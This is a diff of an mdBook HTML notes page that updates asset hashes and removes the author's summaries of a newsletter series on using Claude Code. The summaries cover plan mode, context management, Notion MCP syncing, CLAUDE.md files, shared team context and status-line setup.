@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-e9b1a214.js";
+            window.path_to_searchindex_js = "searchindex-6eebffaf.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-671755c2.js"></script>
+        <script src="toc-2654b6d4.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -182,1050 +182,7 @@
 
                 <div id="mdbook-content" class="content">
                     <main>
-                        <h1 id="ai"><a class="header" href="#ai">AI</a></h1>
-<p>Notes on AI tools, workflows, and concepts.</p>
-<ul>
-<li><a href="AI/in-the-weeds/README.html">In the Weeds Article Notes</a> - Notes from Hannah Stulberg’s “In the Weeds” newsletter on practical AI workflows</li>
-<li><a href="#notes">General Notes</a></li>
-<li><a href="#mcp-vs-skills">MCP vs Skills</a></li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="notes"><a class="header" href="#notes">Notes</a></h1>
-<ul>
-<li>“Boris Cherny, the creator of Claude Code at Anthropic, recently shared his personal workflow for using Claude Code. His setup is surprisingly vanilla - proof that Claude Code works well out of the box. However, one tip stood out: most of his sessions start in Plan mode. He goes back and forth with Claude until he likes the plan, then switches to auto-accept edits and lets Claude execute.”</li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="mcp-vs-skills"><a href="#mcp-vs-skills" class="header">MCP vs Skills</a></h1>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="in-the-weeds---article-notes"><a class="header" href="#in-the-weeds---article-notes">In the Weeds - Article Notes</a></h1>
-<p>Notes from <a href="https://hannahstulberg.substack.com/">In the Weeds</a>, a newsletter by Hannah Stulberg on practical AI workflows for non-technical professionals.</p>
-<h2 id="claude-code-for-everything-cc4e-series"><a class="header" href="#claude-code-for-everything-cc4e-series">Claude Code for Everything (CC4E) Series</a></h2>
-<p>Read in order – each article builds on the last.</p>
-<ol>
-<li><a href="#cc4e-1-finally-that-personal-assistant-youve-always-wanted">Setup and Installation</a> - Getting Claude Code running</li>
-<li><a href="#cc4e-2-how-the-guy-who-built-it-actually-uses-it">Workflow and Workspace</a> - Boris Cherny’s workflow, plan mode, parallel sessions</li>
-<li><a href="#cc4e-3-why-ai-gets-dumber-the-longer-you-talk-to-it">Context Management</a> - Why AI gets worse over time and how to fix it</li>
-<li><a href="#cc4e-4-draft-in-claude-code-collaborate-in-notion">Notion MCP Sync</a> - Drafting in Claude Code, collaborating in Notion</li>
-<li><a href="#cc4e-5-the-best-personal-assistant-remembers-things-about-you">CLAUDE.md Files</a> - Persistent context across sessions</li>
-<li><a href="#cc4e-6-the-one-file-that-can-save-your-team-thousands-of-hours">Shared Context Files</a> - Team-level context that compounds</li>
-<li><a href="#cc4e-7-your-status-line-is-empty-lets-fix-that">Status Line</a> - Customizing the terminal status bar</li>
-<li><a href="#cc4e-8-keeping-up-with-the-claude-code-treadmill-30-tips--tricks">30 Tips and Tricks</a> - Curated tips from 1,500+ hours of use</li>
-</ol>
-<h2 id="tool-school-series"><a class="header" href="#tool-school-series">Tool School Series</a></h2>
-<ol>
-<li><a href="#tool-school-github-101-github-is-the-new-google-drive">GitHub 101</a> - GitHub explained for non-developers (with Sidwyn Koh)</li>
-<li><a href="#tool-school-benchmarking-101-how-to-read-ai-model-report-cards">Benchmarking 101</a> - How to read AI model scorecards (with Akshat Khandelwal)</li>
-</ol>
-<h2 id="standalone-articles"><a class="header" href="#standalone-articles">Standalone Articles</a></h2>
-<ul>
-<li><a href="#skip-the-terminal-and-8-other-claude-code-tricks-for-non-technical-users">Skip the Terminal</a> - 9 Claude Code tricks for non-technical users</li>
-<li><a href="#stop-typing-start-talking-dictation--ai-editing">Stop Typing, Start Talking</a> - Dictation + AI editing workflow</li>
-<li><a href="#build-a-team-os-with-claude-code">Build a Team OS</a> - Shared repo as team operating system (by Aakash Gupta, featuring Hannah)</li>
-<li><a href="#business-sense-for-engineers-the-missing-half-of-product-sense">Business Sense for Engineers</a> - The missing half of product sense (with Sidwyn Koh)</li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="claude-code-for-everything-cc4e-series-1"><a class="header" href="#claude-code-for-everything-cc4e-series-1">Claude Code for Everything (CC4E) Series</a></h1>
-<p>By Hannah Stulberg. An 8-part series teaching Claude Code from fundamentals to advanced usage, designed for non-technical professionals.</p>
-<ol>
-<li><a href="#cc4e-1-finally-that-personal-assistant-youve-always-wanted">Setup and Installation</a></li>
-<li><a href="#cc4e-2-how-the-guy-who-built-it-actually-uses-it">Workflow and Workspace</a></li>
-<li><a href="#cc4e-3-why-ai-gets-dumber-the-longer-you-talk-to-it">Context Management</a></li>
-<li><a href="#cc4e-4-draft-in-claude-code-collaborate-in-notion">Notion MCP Sync</a></li>
-<li><a href="#cc4e-5-the-best-personal-assistant-remembers-things-about-you">CLAUDE.md Files</a></li>
-<li><a href="#cc4e-6-the-one-file-that-can-save-your-team-thousands-of-hours">Shared Context Files</a></li>
-<li><a href="#cc4e-7-your-status-line-is-empty-lets-fix-that">Status Line</a></li>
-<li><a href="#cc4e-8-keeping-up-with-the-claude-code-treadmill-30-tips--tricks">30 Tips and Tricks</a></li>
-</ol>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="cc4e-1-finally-that-personal-assistant-youve-always-wanted"><a class="header" href="#cc4e-1-finally-that-personal-assistant-youve-always-wanted">CC4E #1: Finally, That Personal Assistant You’ve Always Wanted</a></h1>
-<p><strong>Author:</strong> Hannah Stulberg | <strong>Published:</strong> 2026-01-09</p>
-<p>A step-by-step setup guide for non-technical users. The “junior employee” metaphor: Claude Code is a trainable assistant who handles tedious work and follows you from work to personal life.</p>
-<h2 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h2>
-<ul>
-<li>Mac or Windows computer</li>
-<li>Anthropic account with Claude Pro ($20/mo) or Max ($100/mo) subscription</li>
-<li>~30 minutes for one-time setup</li>
-</ul>
-<h2 id="setup-steps"><a class="header" href="#setup-steps">Setup Steps</a></h2>
-<h3 id="1-install-an-ide"><a class="header" href="#1-install-an-ide">1. Install an IDE</a></h3>
-<ul>
-<li>An IDE (Integrated Development Environment) combines file browser, text editor, and terminal in one window</li>
-<li>Do NOT use the standalone Terminal – it’s a “black box” where you can’t see files or changes</li>
-<li>Recommended: Cursor. Alternatives: VS Code (free), Windsurf (free)</li>
-</ul>
-<h3 id="2-create-a-working-folder"><a class="header" href="#2-create-a-working-folder">2. Create a Working Folder</a></h3>
-<ul>
-<li>Claude Code works with local files, not cloud-hosted docs like Google Docs</li>
-<li>Install a cloud storage desktop app (Dropbox, Google Drive, iCloud, OneDrive) so files sync</li>
-<li>Create a folder inside it as Claude’s “home base” (e.g., “Claude Agent”)</li>
-</ul>
-<h3 id="3-learn-the-ide-layout"><a class="header" href="#3-learn-the-ide-layout">3. Learn the IDE Layout</a></h3>
-<p>Four areas:</p>
-<ol>
-<li><strong>File browser</strong> (left sidebar) – navigate files and folders</li>
-<li><strong>Editor area</strong> (center) – view and edit files, supports tabs</li>
-<li><strong>Terminal</strong> (bottom panel) – where Claude Code runs; supports multiple instances</li>
-<li><strong>AI pane</strong> (right sidebar) – Cursor’s built-in AI chat, separate from Claude Code</li>
-</ol>
-<h3 id="4-install-claude-code-cli"><a class="header" href="#4-install-claude-code-cli">4. Install Claude Code CLI</a></h3>
-<ul>
-<li>Install the <strong>CLI version</strong>, NOT IDE extensions from the marketplace. The CLI has more features (status line, better parallel session support)</li>
-<li><strong>Option A (recommended):</strong> Native installer via curl (Mac/Linux) or irm (Windows)</li>
-<li><strong>Option B:</strong> Homebrew (<code>brew install --cask claude-code</code>) – no auto-updates</li>
-</ul>
-<h3 id="5-understand-markdown"><a class="header" href="#5-understand-markdown">5. Understand Markdown</a></h3>
-<ul>
-<li>Claude Code creates <code>.md</code> files. Markdown is plain text with simple formatting symbols</li>
-<li>Why markdown: Word/Google Docs have hidden formatting codes Claude can’t see. Markdown is transparent – “what you see is exactly what Claude sees”</li>
-<li>IDE preview mode renders markdown visually (right-click &gt; Open Preview)</li>
-</ul>
-<h3 id="6-understand-bash-commands"><a class="header" href="#6-understand-bash-commands">6. Understand Bash Commands</a></h3>
-<ul>
-<li>Essential commands: <code>ls</code> (list files), <code>cat</code> (display contents), <code>mv</code> (move/rename), <code>cd</code> (change directory)</li>
-<li>Pre-allow safe commands (<code>ls</code>, <code>cd</code>, <code>mv</code>, <code>cp</code>, <code>cat</code>, <code>open</code>) so Claude doesn’t ask permission each time</li>
-<li>Pre-allow file reading and web fetching for smoother workflow</li>
-</ul>
-<h3 id="7-install-document-skills-optional"><a class="header" href="#7-install-document-skills-optional">7. Install Document Skills (optional)</a></h3>
-<ul>
-<li>Adds support for creating/editing PDF, DOCX, PPTX, XLSX</li>
-<li>Install via Anthropic skills marketplace, restart Claude Code afterward</li>
-</ul>
-<h2 id="key-takeaways"><a class="header" href="#key-takeaways">Key Takeaways</a></h2>
-<ul>
-<li>Claude Code is for everyone, not just developers – the name is a misnomer</li>
-<li>Use an IDE, not the standalone terminal</li>
-<li>Install the CLI version for full feature access</li>
-<li>Markdown is the lingua franca between you and Claude</li>
-<li>Pre-allowing safe operations removes friction</li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="cc4e-2-how-the-guy-who-built-it-actually-uses-it"><a class="header" href="#cc4e-2-how-the-guy-who-built-it-actually-uses-it">CC4E #2: How the Guy Who Built It Actually Uses It</a></h1>
-<p><strong>Author:</strong> Hannah Stulberg | <strong>Published:</strong> 2026-01-13</p>
-<p>Based on Boris Cherny’s (creator of Claude Code) publicly shared workflow. His setup is “surprisingly vanilla” – the tool works well out of the box.</p>
-<h2 id="core-workflow"><a class="header" href="#core-workflow">Core Workflow</a></h2>
-<h3 id="1-the-three-modes"><a class="header" href="#1-the-three-modes">1. The Three Modes</a></h3>
-<p>Cycle with <strong>Shift+Tab</strong>:</p>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Mode</th><th>When to use</th><th>Junior employee analogy</th></tr>
-</thead>
-<tbody>
-<tr><td><strong>Plan mode</strong></td><td>Big decisions, new tasks</td><td>“Outline the approach before starting”</td></tr>
-<tr><td><strong>Default mode</strong></td><td>Executing the plan</td><td>“Sit side by side, review each change”</td></tr>
-<tr><td><strong>Accept edits</strong></td><td>Simple mechanical tasks</td><td>“Just format the appendix, I trust you”</td></tr>
-</tbody>
-</table>
-</div>
-<ul>
-<li>Match oversight to confidence. Flip between modes constantly during a single task</li>
-<li>Actually read the plan and give feedback – an unread plan gives false confidence</li>
-<li>Boris starts most sessions in plan mode, aligns on the plan, then switches to auto-accept</li>
-</ul>
-<h3 id="2-parallel-sessions"><a class="header" href="#2-parallel-sessions">2. Parallel Sessions</a></h3>
-<ul>
-<li>Each Claude Code instance is a separate “junior employee” focused on one task</li>
-<li>Mixing unrelated tasks in one session degrades quality (context contamination)</li>
-<li>Boris runs 5+ sessions simultaneously</li>
-<li>Setup: open separate terminal instances in your IDE</li>
-</ul>
-<h3 id="3-session-management"><a class="header" href="#3-session-management">3. Session Management</a></h3>
-<ul>
-<li>Without naming sessions, every new start is a blank slate</li>
-<li><code>/rename</code> to name sessions (e.g., <code>/rename Q1 Planning Meeting</code>)</li>
-<li>Resume via <code>/resume</code> (browse), <code>/resume [name]</code> (direct), or <code>claude --resume [name]</code> (terminal)</li>
-<li>Pro tip: save the session name in the markdown file you’re working on</li>
-</ul>
-<h3 id="4-background-agents"><a class="header" href="#4-background-agents">4. Background Agents</a></h3>
-<ul>
-<li>Delegate related tasks to another Claude instance that runs independently</li>
-<li>You keep working; the background agent notifies when finished</li>
-<li>Check status with <code>/tasks</code></li>
-<li>Sweet spot: tasks that need current session’s context but shouldn’t block you</li>
-<li>If the task is unrelated, open a separate terminal instead</li>
-</ul>
-<h2 id="workspace-setup"><a class="header" href="#workspace-setup">Workspace Setup</a></h2>
-<ol>
-<li><strong>Split editor</strong> – markdown on left, preview on right, scrolling in tandem</li>
-<li><strong>Clickable table of contents</strong> – ask Claude to add one for long documents</li>
-<li><strong>Use an IDE</strong> – files, documents, and terminal in one window. Avoid third-party wrappers</li>
-<li><strong>Install vscode-pdf</strong> – view PDFs directly in the editor</li>
-</ol>
-<h2 id="model-choice"><a class="header" href="#model-choice">Model Choice</a></h2>
-<p>Boris uses Opus 4.5 with thinking for everything, even though it’s slower – you steer it less, so it’s almost always faster in the end. Better quality compounds: less correcting, less back-and-forth, better first drafts.</p>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="cc4e-3-why-ai-gets-dumber-the-longer-you-talk-to-it"><a class="header" href="#cc4e-3-why-ai-gets-dumber-the-longer-you-talk-to-it">CC4E #3: Why AI Gets Dumber The Longer You Talk To It</a></h1>
-<p><strong>Author:</strong> Hannah Stulberg | <strong>Published:</strong> 2026-01-20</p>
-<p>Context management is “the plumbing” – the unsexy fundamental that nothing else works without.</p>
-<h2 id="context-101-filing-cabinet-metaphor"><a class="header" href="#context-101-filing-cabinet-metaphor">Context 101 (Filing Cabinet Metaphor)</a></h2>
-<p>Each chat session is one <strong>drawer</strong> in a filing cabinet:</p>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Concept</th><th>What it means</th></tr>
-</thead>
-<tbody>
-<tr><td><strong>Context</strong></td><td>The information available to the AI at any point. If it’s not in the drawer, Claude doesn’t know about it</td></tr>
-<tr><td><strong>Context window</strong></td><td>The size of the drawer (~200K tokens / ~200K words / ~3 novels). Fills faster than expected</td></tr>
-<tr><td><strong>Compaction</strong></td><td>At 70-80% full, the AI summarizes to make room. Original text replaced by compressed summary. Nuance is lost each time. In web tools (ChatGPT), this happens silently</td></tr>
-<tr><td><strong>Thinking room</strong></td><td>AI uses the same space for reasoning and storage. More context loaded = less room to think = lower quality output</td></tr>
-</tbody>
-</table>
-</div>
-<h2 id="why-claude-code-is-different"><a class="header" href="#why-claude-code-is-different">Why Claude Code Is Different</a></h2>
-<p>Web-based AI tools (ChatGPT, claude.ai, Gemini) give almost no control over context. Claude Code provides:</p>
-<ul>
-<li><strong>Visibility</strong> – status line shows context usage</li>
-<li><strong>Control</strong> – manual compaction with <code>/compact</code></li>
-<li><strong>Structure</strong> – parallel sessions, session persistence, background agents</li>
-</ul>
-<h2 id="five-context-management-techniques"><a class="header" href="#five-context-management-techniques">Five Context Management Techniques</a></h2>
-<h3 id="1-status-line"><a class="header" href="#1-status-line">1. Status Line</a></h3>
-<ul>
-<li>Shows tokens used vs. total (e.g., <code>47K / 200K</code> or <code>24%</code>)</li>
-<li>Three zones:
-<ul>
-<li><strong>0-50%</strong> – work freely</li>
-<li><strong>50-70%</strong> – getting crowded, consider clearing before complex work</li>
-<li><strong>70%+</strong> – compact manually NOW or auto-compaction decides for you</li>
-</ul>
-</li>
-<li>Enable via <code>/statusline</code></li>
-<li>Only available in the CLI, not VS Code/Cursor extensions</li>
-</ul>
-<h3 id="2-manual-compaction"><a class="header" href="#2-manual-compaction">2. Manual Compaction</a></h3>
-<p>Auto-compaction lets Claude decide what to keep. Manual puts you in control.</p>
-<ol>
-<li>Ask Claude: “What do you currently have in context?”</li>
-<li>Decide what to keep (current docs, active requirements, decisions) vs. drop (old drafts, abandoned tangents)</li>
-<li>Have Claude draft the <code>/compact</code> command for you</li>
-<li>Run <code>/compact</code> with specific instructions. Context typically shrinks to ~15-20%</li>
-<li>Use Ctrl+O to verify what was kept</li>
-</ol>
-<h3 id="3-parallel-sessions"><a class="header" href="#3-parallel-sessions">3. Parallel Sessions</a></h3>
-<ul>
-<li>Each session gets its own drawer – prevents context contamination</li>
-<li>Three separate employees each focused on one task beats one employee juggling three tasks</li>
-</ul>
-<h3 id="4-session-management"><a class="header" href="#4-session-management">4. Session Management</a></h3>
-<ul>
-<li>Name and resume sessions to preserve context across time</li>
-<li>Without this, every new session starts with an empty drawer</li>
-</ul>
-<h3 id="5-background-agents"><a class="header" href="#5-background-agents">5. Background Agents</a></h3>
-<ul>
-<li>For related side tasks that need your current context but shouldn’t clutter the main session</li>
-<li>Key distinction: <strong>parallel sessions</strong> = unrelated tasks (each starts empty). <strong>Background agents</strong> = related tasks that need current context</li>
-</ul>
-<h2 id="key-insight"><a class="header" href="#key-insight">Key Insight</a></h2>
-<p>AI output quality is directly tied to how much context space is available, not just what you prompt. Proactive context management separates mediocre AI output from consistently great output.</p>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="cc4e-4-draft-in-claude-code-collaborate-in-notion"><a class="header" href="#cc4e-4-draft-in-claude-code-collaborate-in-notion">CC4E #4: Draft in Claude Code, Collaborate in Notion</a></h1>
-<p><strong>Author:</strong> Hannah Stulberg | <strong>Published:</strong> 2026-01-27</p>
-<p>Bridges the “collaboration gap” between drafting in Claude Code and getting team input via Notion’s MCP server.</p>
-<h2 id="the-problem"><a class="header" href="#the-problem">The Problem</a></h2>
-<p>Claude Code is great for drafting, but work needs feedback from others. Copy-pasting into Google Docs creates version problems. Notion has an official MCP server; Google Docs does not (yet).</p>
-<h2 id="what-mcp-enables"><a class="header" href="#what-mcp-enables">What MCP Enables</a></h2>
-<p>Once connected, Claude Code can:</p>
-<ul>
-<li>Push docs to Notion</li>
-<li>Pull edits back</li>
-<li>Pull collaborator comments (page-level, not inline)</li>
-<li>Keep versions in sync</li>
-<li>Pull existing Notion docs as context</li>
-</ul>
-<h2 id="setup-30-minutes"><a class="header" href="#setup-30-minutes">Setup (~30 minutes)</a></h2>
-<ol>
-<li>Ask Claude to add the Notion MCP server (project-level or global)</li>
-<li>Restart Claude Code</li>
-<li>Run <code>/mcp</code>, complete OAuth flow to authenticate with Notion</li>
-<li>Verify by asking Claude to search your workspace</li>
-</ol>
-<h2 id="notion-workspace-setup"><a class="header" href="#notion-workspace-setup">Notion Workspace Setup</a></h2>
-<p>Create a database (table) to track synced documents with four properties:</p>
-<ul>
-<li><strong>Title</strong> – document name</li>
-<li><strong>Status</strong> – Draft / In Review / Final</li>
-<li><strong>Local Path</strong> – path to local file</li>
-<li><strong>Last Synced</strong> – date</li>
-</ul>
-<h2 id="the-sync-workflow"><a class="header" href="#the-sync-workflow">The Sync Workflow</a></h2>
-<p><strong>Golden rule: always compare before syncing, never overwrite blindly.</strong></p>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Direction</th><th>Process</th></tr>
-</thead>
-<tbody>
-<tr><td><strong>New doc to Notion</strong></td><td>Draft locally, tell Claude to push. Full content push is fine for new docs</td></tr>
-<tr><td><strong>Update existing</strong></td><td>Claude compares versions, shows diff, makes targeted updates only. Preserves collaborator comments and formatting</td></tr>
-<tr><td><strong>Pull from Notion</strong></td><td>Claude compares, shows differences, you choose what to pull</td></tr>
-<tr><td><strong>Conflicts</strong></td><td>Compare-first prompts identify conflicts. Review section by section, merge manually, or pull first then re-apply</td></tr>
-</tbody>
-</table>
-</div>
-<p><strong>Comment limitation:</strong> Claude can read page-level comments (discussion thread at top) but NOT inline comments (text highlights). Workaround: ask collaborators to leave high-level feedback as page comments.</p>
-<h2 id="custom-commands"><a class="header" href="#custom-commands">Custom Commands</a></h2>
-<p>Create <code>/push-to-notion</code> and <code>/pull-from-notion</code> slash commands in <code>.claude/commands/</code> to encode all the sync logic. Key elements to verify:</p>
-<ul>
-<li>Search before creating (no duplicates)</li>
-<li>Fetch and compare (know what’s different before changing)</li>
-<li>Show the diff (user confirms before sync)</li>
-<li>Targeted updates (only change what’s different)</li>
-</ul>
-<h2 id="document-your-setup"><a class="header" href="#document-your-setup">Document Your Setup</a></h2>
-<p>Add Notion config to your project’s CLAUDE.md (database URL, schema, workflow) so Claude remembers across sessions.</p>
-<h2 id="when-to-use"><a class="header" href="#when-to-use">When to Use</a></h2>
-<ul>
-<li><strong>Good for:</strong> docs needing collaboration, review cycles, rich formatting</li>
-<li><strong>Not ideal for:</strong> personal notes, throwaway drafts, real-time simultaneous editing</li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="cc4e-5-the-best-personal-assistant-remembers-things-about-you"><a class="header" href="#cc4e-5-the-best-personal-assistant-remembers-things-about-you">CC4E #5: The Best Personal Assistant Remembers Things About You</a></h1>
-<p><strong>Author:</strong> Hannah Stulberg | <strong>Published:</strong> 2026-02-14</p>
-<p>A deep dive on CLAUDE.md files – onboarding documents that auto-load so Claude starts every session already briefed. Solves the “Groundhog Day employee” problem.</p>
-<h2 id="how-claudemd-files-work"><a class="header" href="#how-claudemd-files-work">How CLAUDE.md Files Work</a></h2>
-<ul>
-<li>Plain text markdown files, named exactly <code>CLAUDE.md</code> (all caps required)</li>
-<li>Auto-load at session start from the current folder all the way up to the root</li>
-<li><strong>Hierarchical loading:</strong> deeper files layer more specific context on top of general context</li>
-<li><strong>Conflict resolution:</strong> more specific (deeper) file wins</li>
-<li>Applies equally to AGENTS.md (Cursor, Antigravity) – concepts are tool-agnostic</li>
-</ul>
-<h2 id="critical-trade-off"><a class="header" href="#critical-trade-off">Critical Trade-Off</a></h2>
-<p>Every line in a CLAUDE.md file consumes <strong>thinking room</strong> from the start. More context loaded = less room to think = lower quality output. Be intentional about what goes in.</p>
-<ul>
-<li>If CLAUDE.md files push context to 10-15% before you start, they’re too heavy</li>
-<li>Practical ceiling: ~150 total instructions across all loaded files (Claude Code’s system prompt uses ~50, leaving ~100-150)</li>
-</ul>
-<h2 id="folder-structure-controls-context"><a class="header" href="#folder-structure-controls-context">Folder Structure Controls Context</a></h2>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Level</th><th>Location</th><th>Contains</th></tr>
-</thead>
-<tbody>
-<tr><td>Level 0</td><td><code>~/CLAUDE.md</code></td><td>Personal working style, portable across jobs</td></tr>
-<tr><td>Level 1</td><td><code>~/Acme/CLAUDE.md</code></td><td>Company context, role, team, areas</td></tr>
-<tr><td>Level 2</td><td><code>~/Acme/Marketing/CLAUDE.md</code></td><td>Domain-specific (brand voice, processes)</td></tr>
-<tr><td>Level 3</td><td><code>~/Acme/Marketing/Q1Campaign/CLAUDE.md</code></td><td>Project goals, timeline, decisions, status</td></tr>
-</tbody>
-</table>
-</div>
-<p>Only create a CLAUDE.md when you have context that is (1) specific to that level and (2) needed across multiple sessions.</p>
-<h2 id="four-types-of-content"><a class="header" href="#four-types-of-content">Four Types of Content</a></h2>
-<ol>
-<li><strong>Document index</strong> – map of what’s where so Claude doesn’t search blindly. Can use <code>@</code> imports for auto-loading specific files</li>
-<li><strong>The people involved</strong> – names, roles, relationships at the relevant level</li>
-<li><strong>What this is about</strong> – identity, goals, key facts</li>
-<li><strong>How you want things done</strong> – workflows, processes, preferences, guardrails</li>
-</ol>
-<h2 id="what-does-not-belong"><a class="header" href="#what-does-not-belong">What Does NOT Belong</a></h2>
-<ul>
-<li>Passwords, API keys, sensitive data</li>
-<li>Context that belongs at a different level</li>
-<li>Info that changes so frequently it’ll be stale next session</li>
-<li>Templates (use custom slash commands instead – loaded on demand)</li>
-<li><strong>Litmus test:</strong> if a piece of context isn’t relevant to the vast majority of sessions where that file loads, it doesn’t belong</li>
-</ul>
-<h2 id="three-methods-to-write-them"><a class="header" href="#three-methods-to-write-them">Three Methods to Write Them</a></h2>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Method</th><th>When to use</th><th>How</th></tr>
-</thead>
-<tbody>
-<tr><td><strong>Plan mode interview</strong></td><td>Context lives in your head</td><td>Plan mode, Claude interviews you, you answer conversationally</td></tr>
-<tr><td><strong>Load docs, then generate</strong></td><td>You have existing documents</td><td>Save docs into the folder, ask Claude to read them and draft</td></tr>
-<tr><td><strong>Generate from a session</strong></td><td>Just finished productive work</td><td>Ask Claude to capture durable context from the session</td></tr>
-</tbody>
-</table>
-</div>
-<p>Claude drafts, you edit. Always review – Claude may include session-specific details that aren’t durable.</p>
-<h2 id="maintenance"><a class="header" href="#maintenance">Maintenance</a></h2>
-<ul>
-<li>After big sessions: ask Claude if CLAUDE.md needs updating</li>
-<li>When you keep re-explaining the same thing: make it permanent</li>
-<li>Signs a file needs trimming: longer than when created, finished project details, multiple projects crammed in one file</li>
-<li>CLAUDE.md files load at session start. Mid-session edits require re-reading the file, <code>/clear</code>, or a new session</li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="cc4e-6-the-one-file-that-can-save-your-team-thousands-of-hours"><a class="header" href="#cc4e-6-the-one-file-that-can-save-your-team-thousands-of-hours">CC4E #6: The One File That Can Save Your Team Thousands of Hours</a></h1>
-<p><strong>Authors:</strong> Hannah Stulberg and Joel Salinas | <strong>Published:</strong> 2026-02-21</p>
-<p>How shared context files turn individual AI use into team intelligence.</p>
-<h2 id="the-problem-re-explaining-context-is-massively-wasteful"><a class="header" href="#the-problem-re-explaining-context-is-massively-wasteful">The Problem: Re-explaining Context Is Massively Wasteful</a></h2>
-<ul>
-<li>Most teams use AI individually – everyone re-explains company context every session</li>
-<li>The math: 5 min/session x 3 sessions/day x 100 people = 25 hours/day = 6,000+ hours/year (3 FTEs doing nothing but re-explaining)</li>
-<li>Four types of context re-explained each time: company, team, role, and project</li>
-</ul>
-<h2 id="the-shift-web-based-to-folder-based-ai"><a class="header" href="#the-shift-web-based-to-folder-based-ai">The Shift: Web-Based to Folder-Based AI</a></h2>
-<ul>
-<li>Web-based tools (ChatGPT, claude.ai) start every conversation blank</li>
-<li>Folder-based tools (Claude Code, Cursor, Antigravity) read instruction files automatically</li>
-<li>Solution: shared CLAUDE.md / AGENTS.md files</li>
-</ul>
-<h2 id="knowledge-compounding"><a class="header" href="#knowledge-compounding">Knowledge Compounding</a></h2>
-<p>The core insight: when one person notices the AI making a mistake and corrects it in the shared file, <strong>everyone’s AI avoids that mistake automatically</strong>.</p>
-<ul>
-<li>Anthropic’s own team does this – they share a single CLAUDE.md for the Claude Code repo, check it into git, contribute to it multiple times a week</li>
-</ul>
-<h2 id="three-requirements"><a class="header" href="#three-requirements">Three Requirements</a></h2>
-<h3 id="1-a-shared-place-to-work"><a class="header" href="#1-a-shared-place-to-work">1. A Shared Place to Work</a></h3>
-<ul>
-<li>Non-technical teams: shared cloud storage (Dropbox, Google Drive, iCloud, OneDrive)</li>
-<li>Technical teams: Git (GitHub, GitLab) – offers version control and change review</li>
-<li>Either way, need a simple approval workflow so unapproved edits don’t slip in</li>
-</ul>
-<h3 id="2-a-folder-structure-that-mirrors-your-company"><a class="header" href="#2-a-folder-structure-that-mirrors-your-company">2. A Folder Structure That Mirrors Your Company</a></h3>
-<p>Organized by departments, teams, and projects. Each level gets more specific. When a team member works on a project, all relevant context files auto-load without re-explaining anything.</p>
-<h3 id="3-a-habit-of-contributing"><a class="header" href="#3-a-habit-of-contributing">3. A Habit of Contributing</a></h3>
-<p>The most important part is not initial setup but ongoing contributions:</p>
-<ul>
-<li>Every time someone notices the AI making a mistake or missing context, they propose an update</li>
-<li>Approval processes should match each level (team file: anyone on team; company file: leadership)</li>
-<li>Over time, these become living documents capturing collective knowledge</li>
-</ul>
-<h2 id="start-small"><a class="header" href="#start-small">Start Small</a></h2>
-<ul>
-<li>Start with one department or team</li>
-<li>Create a shared folder, write a single context file together covering: what the team does, what the AI needs to know, how you want it to work</li>
-<li>Use it, notice what’s missing, update. That’s the whole process</li>
-<li>Once one team sees the benefit, it spreads naturally</li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="cc4e-7-your-status-line-is-empty-lets-fix-that"><a class="header" href="#cc4e-7-your-status-line-is-empty-lets-fix-that">CC4E #7: Your Status Line Is Empty (Let’s Fix That)</a></h1>
-<p><strong>Author:</strong> Hannah Stulberg | <strong>Published:</strong> 2026-03-13</p>
-<p>Turn the bottom of your terminal into a personal command center. Only available in the CLI (not VS Code/Cursor extensions).</p>
-<h2 id="core-argument"><a class="header" href="#core-argument">Core Argument</a></h2>
-<p>Every time you stop to check something (model, folder, context usage, branch, email, calendar), you break flow. The status line makes critical info always visible.</p>
-<h2 id="configuration"><a class="header" href="#configuration">Configuration</a></h2>
-<p>Lives in <code>~/.claude/settings.json</code> (global, applies across all projects).</p>
-<ul>
-<li><strong>Mac/Linux:</strong> Inline commands in settings.json (requires restart)</li>
-<li><strong>Windows:</strong> Write a Node.js script at <code>~/.claude/statusline.js</code> (updates automatically)</li>
-</ul>
-<h2 id="part-1-core-dashboard"><a class="header" href="#part-1-core-dashboard">Part 1: Core Dashboard</a></h2>
-<h3 id="basic-elements"><a class="header" href="#basic-elements">Basic Elements</a></h3>
-<ul>
-<li>Current folder and model name</li>
-<li>Custom labels, emoji icons, Unicode symbols</li>
-</ul>
-<h3 id="visual-styles"><a class="header" href="#visual-styles">Visual Styles</a></h3>
-<ul>
-<li><strong>Plain text with pipes</strong> – clean, works out of the box</li>
-<li><strong>Powerline</strong> – segmented colored blocks with arrow separators (requires Nerd Font, e.g., JetBrains Mono Nerd Font)</li>
-</ul>
-<h3 id="context-progress-bar-essential"><a class="header" href="#context-progress-bar-essential">Context Progress Bar (Essential)</a></h3>
-<p>Color-coded bar showing context window fullness:</p>
-<ul>
-<li><strong>Green</strong> (&lt; 50%) – keep going</li>
-<li><strong>Yellow</strong> (50-70%) – start wrapping up or plan a compact</li>
-<li><strong>Red</strong> (&gt; 70%) – stop and compact now</li>
-</ul>
-<h3 id="usage-tracking"><a class="header" href="#usage-tracking">Usage Tracking</a></h3>
-<ul>
-<li><strong>API users:</strong> Session cost in USD</li>
-<li><strong>Max/Pro plan users:</strong> 5-hour and 7-day rolling utilization percentages
-<ul>
-<li>Data from <code>https://api.anthropic.com/api/oauth/usage</code> (undocumented, may change)</li>
-</ul>
-</li>
-</ul>
